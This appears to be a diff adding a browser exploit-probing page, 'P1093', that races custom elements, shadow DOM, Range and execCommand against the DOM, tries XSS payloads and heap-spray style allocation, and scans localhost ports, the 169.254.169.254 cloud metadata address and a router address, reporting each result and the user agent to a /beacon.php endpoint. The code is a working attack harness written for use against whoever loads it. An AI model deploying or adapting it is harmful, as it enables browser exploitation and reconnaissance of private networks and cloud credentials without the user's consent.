@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>P1093</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px;overflow-y:auto}
+.hud{border:1px solid #1a3a1a;border-radius:4px;margin-bottom:6px;padding:6px;background:#0d1117}
+.title{color:#00ff88;font-size:13px;font-weight:bold;margin-bottom:4px}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}.crit{color:#ff00ff;font-weight:bold}
+</style>
+</head>
+<body>
+<div class="hud">
+<div class="title">P1093 — DOM INTERNALS + CUSTOM ELEMENTS</div>
+<div class="info">Custom Element lifecycle races, Shadow DOM slot mutation, Range on removed DOM, Selection manipulation, execCommand abuse</div>
+</div>
+<div id="log"></div>
+<div id="arena" style="position:absolute;left:-9999px;width:500px"></div>
+
+<script>
+var L=document.getElementById('log'),arena=document.getElementById('arena');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){try{new Image().src='/beacon.php?tag=P1093-'+encodeURIComponent(t)+'&data='+encodeURIComponent(d)+'&_='+Date.now()}catch(e){}}
+function sl(ms){return new Promise(function(r){setTimeout(r,ms)})}
+
+// ============================================================
+// SECTION A: CUSTOM ELEMENTS LIFECYCLE RACE
+// connectedCallback / disconnectedCallback fire during DOM
+// mutation. If the callback modifies the tree being mutated,
+// it can create dangling node references in the engine.
+// ============================================================
+async function sectionA(){
+  log('warn','=== A: CUSTOM ELEMENTS LIFECYCLE ===');
+  var anomalies=0;
+
+  // A1: Check Custom Elements support
+  var hasCE=typeof customElements!=='undefined'&&typeof customElements.define==='function';
+  B('A1-AVAIL','customElements:'+hasCE);
+  log(hasCE?'ok':'fail','[A1] Custom Elements: '+hasCE);
+  if(!hasCE){B('A-DONE','no-CE');return 0}
+
+  // A2: connectedCallback removes self and siblings
+  try{
+    var tag2='evil-remove-'+Date.now();
+    var connected2=0,disconnected2=0;
+    customElements.define(tag2,class extends HTMLElement{
+      connectedCallback(){
+        connected2++;
+        // Remove ALL siblings when connected
+        var parent=this.parentNode;
+        if(parent){
+          var children=Array.from(parent.children);
+          for(var i=0;i<children.length;i++){
+            if(children[i]!==this){
+              try{parent.removeChild(children[i])}catch(e){}
+            }
+          }
+        }
+      }
+      disconnectedCallback(){disconnected2++}
+    });
+
+    for(var round=0;round<20;round++){
+      var container=document.createElement('div');
+      arena.appendChild(container);
+      // Add normal children first
+      for(var i=0;i<5;i++){
+        var div=document.createElement('div');
+        div.textContent='child-'+i;
+        container.appendChild(div);
+      }
+      // Now add the evil element — it will remove siblings in connectedCallback
+      var evil=document.createElement(tag2);
+      container.appendChild(evil);
+
+      // Check if container is in a consistent state
+      if(container.children.length!==1||container.children[0]!==evil){
+        // Unexpected — siblings should have been removed
+        if(container.children.length>6){
+          anomalies++;
+          B('A2-EXTRA','round:'+round+'|children:'+container.children.length);
+          log('crit','[A2-'+round+'] EXTRA children: '+container.children.length);
+        }
+      }
+      arena.removeChild(container);
+    }
+    B('A2-REMOVE','connected:'+connected2+'|disconnected:'+disconnected2+'|anomalies:'+anomalies);
+    log(anomalies>0?'crit':'ok','[A2] connectedCallback remove siblings: '+anomalies+'/20');
+  }catch(e){
+    B('A2-ERR',e.message);
+  }
+
+  // A3: connectedCallback replaces parent
+  try{
+    var tag3='evil-replace-'+Date.now();
+    var replacements3=0;
+    customElements.define(tag3,class extends HTMLElement{
+      connectedCallback(){
+        replacements3++;
+        if(replacements3>100)return; // safety
+        var parent=this.parentNode;
+        if(parent&&parent.parentNode){
+          // Replace entire parent with a new tree
+          var newParent=document.createElement('div');
+          newParent.appendChild(this.cloneNode(true));
+          try{parent.parentNode.replaceChild(newParent,parent)}catch(e){}
+        }
+      }
+    });
+
+    for(var round=0;round<10;round++){
+      replacements3=0;
+      var container=document.createElement('div');
+      arena.appendChild(container);
+      var evil=document.createElement(tag3);
+      container.appendChild(evil);
+      await sl(10);
+
+      // Check arena is consistent
+      if(arena.children.length>50){
+        anomalies++;
+        B('A3-BLOAT','round:'+round+'|children:'+arena.children.length);
+      }
+      // Cleanup
+      while(arena.firstChild)arena.removeChild(arena.firstChild);
+    }
+    B('A3-REPLACE','replacements:'+replacements3+'|anomalies:'+anomalies);
+    log(anomalies>0?'crit':'ok','[A3] connectedCallback replace parent: '+anomalies+'/10');
+  }catch(e){
+    B('A3-ERR',e.message);
+  }
+
+  // A4: attributeChangedCallback that modifies attributes recursively
+  try{
+    var tag4='evil-attr-'+Date.now();
+    var attrCallbacks=0;
+    customElements.define(tag4,class extends HTMLElement{
+      static get observedAttributes(){return['data-val']}
+      attributeChangedCallback(name,oldVal,newVal){
+        attrCallbacks++;
+        if(attrCallbacks>200)return;
+        // Change another observed attribute in the callback
+        var n=parseInt(newVal)||0;
+        if(n<10){
+          this.setAttribute('data-val',String(n+1));
+        }
+      }
+    });
+
+    for(var round=0;round<10;round++){
+      attrCallbacks=0;
+      var el=document.createElement(tag4);
+      arena.appendChild(el);
+      el.setAttribute('data-val','0');
+      await sl(10);
+
+      // Check final value
+      var finalVal=el.getAttribute('data-val');
+      B('A4-ATTR','round:'+round+'|callbacks:'+attrCallbacks+'|final:'+finalVal);
+
+      arena.removeChild(el);
+    }
+    log('ok','[A4] Recursive attributeChanged: tested');
+  }catch(e){
+    B('A4-ERR',e.message);
+  }
+
+  B('A-DONE','total:'+anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION B: SHADOW DOM + SLOT DISTRIBUTION RACE
+// Slotted content distribution can race with DOM mutations
+// when slots are reassigned during rendering.
+// ============================================================
+async function sectionB(){
+  log('warn','=== B: SHADOW DOM + SLOTS ===');
+  var anomalies=0;
+
+  // B1: Check Shadow DOM support
+  var hasShadow=typeof HTMLElement.prototype.attachShadow==='function';
+  B('B1-AVAIL','ShadowDOM:'+hasShadow);
+  log(hasShadow?'ok':'fail','[B1] Shadow DOM: '+hasShadow);
+  if(!hasShadow){B('B-DONE','no-shadow');return 0}
+
+  // B2: Slot reassignment during slotchange
+  try{
+    for(var round=0;round<20;round++){
+      var host=document.createElement('div');
+      var shadow=host.attachShadow({mode:'open'});
+      shadow.innerHTML='<slot name="s1"></slot><slot name="s2"></slot>';
+      arena.appendChild(host);
+
+      var child=document.createElement('span');
+      child.slot='s1';
+      child.textContent='content-'+round;
+      host.appendChild(child);
+
+      // Listen for slotchange and reassign during it
+      var slot1=shadow.querySelector('slot[name=s1]');
+      var slot2=shadow.querySelector('slot[name=s2]');
+      var slotChanges=0;
+
+      slot1.addEventListener('slotchange',function(){
+        slotChanges++;
+        if(slotChanges>10)return;
+        // Move child to other slot during slotchange
+        child.slot='s2';
+      });
+      slot2.addEventListener('slotchange',function(){
+        slotChanges++;
+        if(slotChanges>10)return;
+        child.slot='s1';
+      });
+
+      // Trigger reassignment
+      child.slot='s1';
+      await sl(30);
+
+      // Check: is the child still in a consistent state?
+      var assigned1=slot1.assignedNodes();
+      var assigned2=slot2.assignedNodes();
+      var totalAssigned=assigned1.length+assigned2.length;
+      if(totalAssigned!==1){
+        anomalies++;
+        B('B2-MULTI','round:'+round+'|s1:'+assigned1.length+'|s2:'+assigned2.length);
+        log('crit','[B2-'+round+'] MULTI-SLOT: s1='+assigned1.length+' s2='+assigned2.length);
+      }
+
+      arena.removeChild(host);
+    }
+    B('B2-SLOTCHANGE','slotChanges:'+slotChanges+'|anomalies:'+anomalies);
+    log(anomalies>0?'crit':'ok','[B2] Slot reassignment race: '+anomalies+'/20');
+  }catch(e){
+    B('B2-ERR',e.message);
+  }
+
+  // B3: Shadow host removal during event dispatch
+  try{
+    for(var round=0;round<15;round++){
+      var host=document.createElement('div');
+      var shadow=host.attachShadow({mode:'open'});
+      shadow.innerHTML='<div id="inner"><button id="btn">click</button></div>';
+      arena.appendChild(host);
+
+      var btn=shadow.getElementById('btn');
+      var clickFired=false;
+
+      btn.addEventListener('click',function(e){
+        clickFired=true;
+        // Remove the shadow host during event dispatch
+        try{arena.removeChild(host)}catch(e2){}
+        // Try to access event properties after host removal
+        try{
+          var target=e.target;
+          var composed=e.composedPath();
+          if(composed.length===0){
+            B('B3-EMPTY-PATH','round:'+round);
+          }
+        }catch(e2){
+          anomalies++;
+          B('B3-CRASH','round:'+round+'|'+e2.message);
+          log('crit','[B3-'+round+'] CRASH accessing event after host removal');
+        }
+      });
+
+      btn.click();
+      await sl(10);
+      try{arena.removeChild(host)}catch(e){}
+    }
+    B('B3-HOST-REMOVE','anomalies:'+anomalies);
+    log(anomalies>0?'crit':'ok','[B3] Shadow host removal during event: '+anomalies+'/15');
+  }catch(e){
+    B('B3-ERR',e.message);
+  }
+
+  B('B-DONE','total:'+anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION C: RANGE + SELECTION ON MUTATED DOM
+// Creating a Range, then removing/replacing the nodes it spans,
+// can leave the Range referencing stale nodes.
+// ============================================================
+async function sectionC(){
+  log('warn','=== C: RANGE + SELECTION MANIPULATION ===');
+  var anomalies=0;
+
+  // C1: Range spanning removed nodes
+  for(var round=0;round<20;round++){
+    try{
+      var container=document.createElement('div');
+      container.innerHTML='<p>AAA</p><p>BBB</p><p>CCC</p><p>DDD</p><p>EEE</p>';
+      arena.appendChild(container);
+
+      var range=document.createRange();
+      range.setStart(container.children[1].firstChild,0); // start of BBB
+      range.setEnd(container.children[3].firstChild,3); // end of DDD
+
+      // Remove nodes that the range spans
+      container.removeChild(container.children[2]); // remove CCC
+
+      // Try to use the range after node removal
+      try{
+        var contents=range.cloneContents();
+        var text=contents.textContent;
+        if(text.indexOf('CCC')!==-1){
+          anomalies++;
+          B('C1-STALE','round:'+round+'|text:'+text);
+          log('crit','[C1-'+round+'] STALE range: still contains removed CCC');
+        }
+      }catch(e){/* expected - range may be invalid */}
+
+      // Extract contents
+      try{
+        var extracted=range.extractContents();
+        // This might corrupt the tree if range refs are stale
+      }catch(e){}
+
+      // Check container consistency
+      var childCount=container.children.length;
+      if(childCount<1||childCount>5){
+        anomalies++;
+        B('C1-TREE','round:'+round+'|children:'+childCount);
+      }
+
+      arena.removeChild(container);
+    }catch(e){
+      B('C1-ERR','round:'+round+'|'+e.message);
+    }
+  }
+  B('C1-RANGE','anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok','[C1] Range+remove: '+anomalies+'/20');
+
+  // C2: Selection + innerHTML replacement
+  for(var round=0;round<15;round++){
+    try{
+      var container=document.createElement('div');
+      container.contentEditable='true';
+      container.innerHTML='<b>bold</b><i>italic</i><u>underline</u>';
+      arena.appendChild(container);
+
+      // Create a selection
+      var sel=window.getSelection();
+      var range=document.createRange();
+      range.selectNodeContents(container);
+      sel.removeAllRanges();
+      sel.addRange(range);
+
+      // Replace innerHTML while selection is active
+      container.innerHTML='<span>REPLACED</span>';
+
+      // Try to use selection after replacement
+      try{
+        var selText=sel.toString();
+        var anchorNode=sel.anchorNode;
+        var focusNode=sel.focusNode;
+        if(anchorNode&&anchorNode.textContent&&anchorNode.textContent.indexOf('bold')!==-1){
+          anomalies++;
+          B('C2-STALE-SEL','round:'+round);
+          log('crit','[C2-'+round+'] STALE selection references removed node');
+        }
+      }catch(e){}
+
+      arena.removeChild(container);
+    }catch(e){
+      B('C2-ERR','round:'+round+'|'+e.message);
+    }
+  }
+  B('C2-SELECTION','anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok','[C2] Selection+innerHTML: '+anomalies+'/15');
+
+  // C3: TreeWalker on modified tree
+  try{
+    for(var round=0;round<15;round++){
+      var container=document.createElement('div');
+      for(var i=0;i<20;i++){
+        var p=document.createElement('p');
+        p.textContent='node-'+i;
+        container.appendChild(p);
+      }
+      arena.appendChild(container);
+
+      var walker=document.createTreeWalker(container,NodeFilter.SHOW_ELEMENT);
+      var visited=[];
+      var node;
+      while(node=walker.nextNode()){
+        visited.push(node.textContent);
+        // Remove future nodes while walking
+        if(visited.length===5){
+          for(var i=container.children.length-1;i>10;i--){
+            container.removeChild(container.children[i]);
+          }
+        }
+      }
+
+      // Check for duplicate visits or stale references
+      var unique=visited.filter(function(v,i,a){return a.indexOf(v)===i});
+      if(unique.length!==visited.length){
+        anomalies++;
+        B('C3-DUP','round:'+round+'|visited:'+visited.length+'|unique:'+unique.length);
+        log('crit','[C3-'+round+'] DUPLICATE visits in TreeWalker');
+      }
+
+      arena.removeChild(container);
+    }
+  }catch(e){
+    B('C3-ERR',e.message);
+  }
+  B('C3-WALKER','anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok','[C3] TreeWalker+remove: '+anomalies+'/15');
+
+  B('C-DONE','total:'+anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION D: DOCUMENT.EXECCOMMAND ABUSE
+// Legacy editing commands with malformed arguments.
+// ============================================================
+async function sectionD(){
+  log('warn','=== D: EXECCOMMAND ABUSE ===');
+  var anomalies=0;
+
+  var container=document.createElement('div');
+  container.contentEditable='true';
+  container.innerHTML='<p>Hello <b>World</b> test <a href="http://x">link</a></p>';
+  arena.appendChild(container);
+  container.focus();
+
+  // Select all content
+  var sel=window.getSelection();
+  var range=document.createRange();
+  range.selectNodeContents(container);
+  sel.removeAllRanges();
+  sel.addRange(range);
+
+  var commands=[
+    ['insertHTML','<img src=x onerror=B("D-XSS","execCommand-insertHTML")>'],
+    ['insertHTML','<div style="position:fixed;width:99999px;height:99999px">HUGE</div>'],
+    ['createLink','javascript:void(0)'],
+    ['createLink','data:text/html,<script>alert(1)</script>'],
+    ['formatBlock','<script>'],
+    ['fontSize','99999'],
+    ['foreColor','expression(alert(1))'],
+    ['insertHTML','<table><tr><td><table><tr><td>'.repeat(50)+'X'+'</td></tr></table>'.repeat(50)],
+    ['insertHTML','<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>B("D-SVG","foreignObject")</script></body></foreignObject></svg>'],
+    ['indent',''],
+    ['outdent',''],
+    ['insertOrderedList',''],
+    ['insertUnorderedList',''],
+    ['justifyCenter',''],
+    ['removeFormat',''],
+  ];
+
+  for(var i=0;i<commands.length;i++){
+    try{
+      var cmd=commands[i][0],val=commands[i][1];
+      // Re-select before each command
+      range=document.createRange();
+      range.selectNodeContents(container);
+      sel.removeAllRanges();
+      sel.addRange(range);
+
+      var result=document.execCommand(cmd,false,val);
+      B('D-CMD','cmd:'+cmd+'|ret:'+result);
+
+      // Check for escaped content
+      if(container.innerHTML.indexOf('onerror')!==-1){
+        anomalies++;
+        B('D-XSS-FOUND','cmd:'+cmd);
+        log('crit','[D] XSS via execCommand('+cmd+')!');
+      }
+    }catch(e){
+      B('D-CMD-ERR','cmd:'+cmd+'|'+e.message);
+    }
+  }
+
+  // Check for deeply nested tables causing stack overflow
+  try{
+    var depth=0;
+    var node=container;
+    while(node.firstElementChild){node=node.firstElementChild;depth++}
+    if(depth>200){
+      B('D-DEEP','depth:'+depth);
+      log('warn','[D] Deep nesting: '+depth+' levels');
+    }
+  }catch(e){}
+
+  arena.removeChild(container);
+  B('D-DONE','cmds:'+commands.length+'|anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok','[D] execCommand: '+anomalies+'/'+commands.length);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION E: CSS @FONT-FACE LOADING RACE
+// font load + layout + removal can race when the font arrives
+// asynchronously and the elements using it have been removed.
+// ============================================================
+async function sectionE(){
+  log('warn','=== E: FONT LOADING RACE ===');
+  var anomalies=0;
+
+  for(var round=0;round<10;round++){
+    try{
+      // Create a style that references a slow-loading font
+      var style=document.createElement('style');
+      style.textContent='@font-face{font-family:"test-'+round+'";src:url(data:font/woff2;base64,d09GMgABAAAA'+round+') format("woff2")}'+
+        '.font-test-'+round+'{font-family:"test-'+round+'",monospace}';
+      document.head.appendChild(style);
+
+      // Create elements using the font
+      var elements=[];
+      for(var i=0;i<20;i++){
+        var el=document.createElement('div');
+        el.className='font-test-'+round;
+        el.textContent='Font test text that needs layout calculation '+i;
+        el.style.cssText='position:absolute;left:-9999px';
+        document.body.appendChild(el);
+        elements.push(el);
+      }
+
+      // Force layout
+      for(var i=0;i<elements.length;i++){
+        void elements[i].offsetWidth;
+      }
+
+      // Remove elements while font might be loading
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      document.head.removeChild(style);
+
+      // Allocate to fill freed slots
+      for(var i=0;i<50;i++){
+        var dummy=document.createElement('span');
+        dummy.textContent='spray-'+i;
+        arena.appendChild(dummy);
+      }
+      while(arena.firstChild)arena.removeChild(arena.firstChild);
+
+      await sl(20);
+    }catch(e){
+      B('E-ERR','round:'+round+'|'+e.message);
+    }
+  }
+  B('E-DONE','anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok','[E] Font loading race: '+anomalies+'/10');
+  return anomalies;
+}
+
+// ============================================================
+// SECTION F: WEBSOCKET + FETCH AVAILABILITY + INTERNAL PROBING
+// Check what network APIs are available and probe internal services
+// ============================================================
+async function sectionF(){
+  log('warn','=== F: NETWORK API PROBING ===');
+  var anomalies=0;
+
+  // F1: API availability
+  var apis={
+    WebSocket:typeof WebSocket,
+    EventSource:typeof EventSource,
+    fetch:typeof fetch,
+    XMLHttpRequest:typeof XMLHttpRequest,
+    navigator_sendBeacon:typeof navigator.sendBeacon,
+    ServiceWorker:typeof navigator.serviceWorker,
+    CacheAPI:typeof caches,
+    BackgroundFetch:'BackgroundFetchManager' in window?'yes':'no',
+  };
+  var apiStr=Object.keys(apis).map(function(k){return k+'='+apis[k]}).join('|');
+  B('F1-APIS',apiStr);
+  log('info','[F1] Network APIs: '+apiStr);
+
+  // F2: WebSocket availability and localhost probing
+  if(typeof WebSocket!=='undefined'){
+    var ports=[80,443,8080,9090,1234,12345,3000,5000,9999];
+    for(var i=0;i<ports.length;i++){
+      try{
+        var ws=new WebSocket('ws://127.0.0.1:'+ports[i]);
+        var result='timeout';
+        ws.onopen=function(){result='OPEN';ws.close();B('F2-WS-OPEN','port:'+ports[i]);log('crit','[F2] WebSocket OPEN on localhost:'+ports[i])};
+        ws.onerror=function(){result='error'};
+        ws.onclose=function(){};
+        await sl(200);
+        if(ws.readyState!==WebSocket.CLOSED)ws.close();
+      }catch(e){}
+    }
+    B('F2-WS','probed:'+ports.length);
+    log('ok','[F2] WebSocket localhost: probed '+ports.length+' ports');
+  }
+
+  // F3: fetch to local/internal addresses
+  var targets=[
+    'http://127.0.0.1/',
+    'http://localhost/',
+    'http://[::1]/',
+    'http://169.254.169.254/', // link-local metadata
+    'http://192.168.1.1/', // typical router
+  ];
+  for(var i=0;i<targets.length;i++){
+    try{
+      var resp=await Promise.race([
+        fetch(targets[i],{mode:'no-cors',cache:'no-store'}).then(function(r){return{status:r.status,type:r.type}}),
+        sl(500).then(function(){return{status:'timeout',type:'timeout'}})
+      ]);
+      B('F3-FETCH','target:'+targets[i]+'|status:'+resp.status+'|type:'+resp.type);
+      if(resp.type==='basic'||resp.status===200){
+        log('warn','[F3] Fetch reachable: '+targets[i]+' ('+resp.type+')');
+      }
+    }catch(e){
+      B('F3-FETCH-ERR','target:'+targets[i]+'|'+e.message.substring(0,50));
+    }
+  }
+  log('ok','[F3] Internal fetch: probed '+targets.length);
+
+  // F4: Service Worker registration
+  if(navigator.serviceWorker){
+    try{
+      var reg=await navigator.serviceWorker.register('/sw.js');
+      B('F4-SW','registered:true');
+      log('crit','[F4] Service Worker REGISTERED!');
+      anomalies++;
+    }catch(e){
+      B('F4-SW','blocked:'+e.message.substring(0,80));
+      log('info','[F4] SW blocked: '+e.message.substring(0,60));
+    }
+  }
+
+  B('F-DONE','total:'+anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+async function run(){
+  B('BOOT',navigator.userAgent.substring(0,80));
+  log('ok','=== P1093: DOM INTERNALS + CUSTOM ELEMENTS ===');
+  log('info','Custom Elements, Shadow DOM, Range/Selection, execCommand, font race, network probing');
+  log('ok','');
+
+  var total=0;
+  total+=await sectionA();log('ok','');await sl(100);
+  total+=await sectionB();log('ok','');await sl(100);
+  total+=await sectionC();log('ok','');await sl(100);
+  total+=await sectionD();log('ok','');await sl(100);
+  total+=await sectionE();log('ok','');await sl(100);
+  total+=await sectionF();
+
+  log('ok','');
+  B('ALL-DONE','sections:6|total:'+total);
+  log(total>0?'crit':'ok','=== P1093 COMPLETE: '+total+' anomalies ===');
+}
+run();
+</script>
+</body>
+</html>
